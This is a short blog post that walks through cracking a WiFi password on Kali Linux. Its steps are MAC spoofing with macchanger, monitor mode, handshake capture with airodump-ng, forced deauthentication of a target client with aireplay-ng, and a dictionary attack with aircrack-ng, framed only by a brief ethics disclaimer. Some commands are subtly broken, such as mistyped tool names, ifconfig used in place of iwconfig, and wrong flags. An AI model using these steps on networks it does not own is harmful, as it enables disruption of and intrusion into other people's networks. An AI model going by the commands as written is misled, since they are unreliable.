---
layout: post
title: Decrypt Wifi Password?
categories: Other
image: wifi.png
description: How to decrypt wifi password | hack wifi password | Kali Linux | 
---

There are various algorithms implemented to encrypt passwords. 
It's not ethical to steal passwords of any kind, without owner's consent. However
we can setup our own environment to do some ethical practises and there are tools available for the purpose.<br>

<!--continue-->

Kali Linux is one the OS preferred for penetration testing. We can use programs in Kali OS to 
experiment with vulnerable wifi passwords in our network.<br>

<li> Change MAC address    
  <pre>macchanger  --random wlan0</pre>
    <p> MAC(Media Access Control) Address is loaded into RAM during boot and this can be changed.<br>
    </p>
</li>
<li>Set Up Monitor Mode to Wireless Interface

<p>Change the defualt 'Managed Mode' of our Wireless Interface to 'Monitor Mode'. This enables
us to collect all the packets from the router.</p>
<pre>iwconfig wlan0
ifconfig wlan0 down
ifconfig wlan0 mode monitor
ifocnig wlan0 up
iwconfig wlan0</pre>

</li>

<li>Catch Enough handshakes
<pre>
#get the required AP,channel, bssid using program airmon-ng on wireless interface
airmon-ng wlan0

#Capture every packets sent by AP on our interface usng program airodump-ng
airodump-ng --channel [channel] --bssid [bssid]  --write [filename] [interface]

#Deauthenticate client or/and wait for client to reconnect to wifi
aireplay-ng --deauth[number of deauth packets] -a [AP] -c[target] [interface]
</pre>
</li>

<li>Crack the Key
<pre>#Download the world list file and use aicrack-ng tool to crack the key
aircrack-ng [handshake filename] --w [wordlist] [interface]</pre>
</li>


<p> Some common wireless encryptions today are WEP, WPA, WPA2. WPA/WPA2 is considered as secure one. With WPS feautre enabled, it might be easier to crack the wifi. And if not, the only way is the dictionary  attack which involves comparing the dictionay(list of passwords) with handshake file.</p>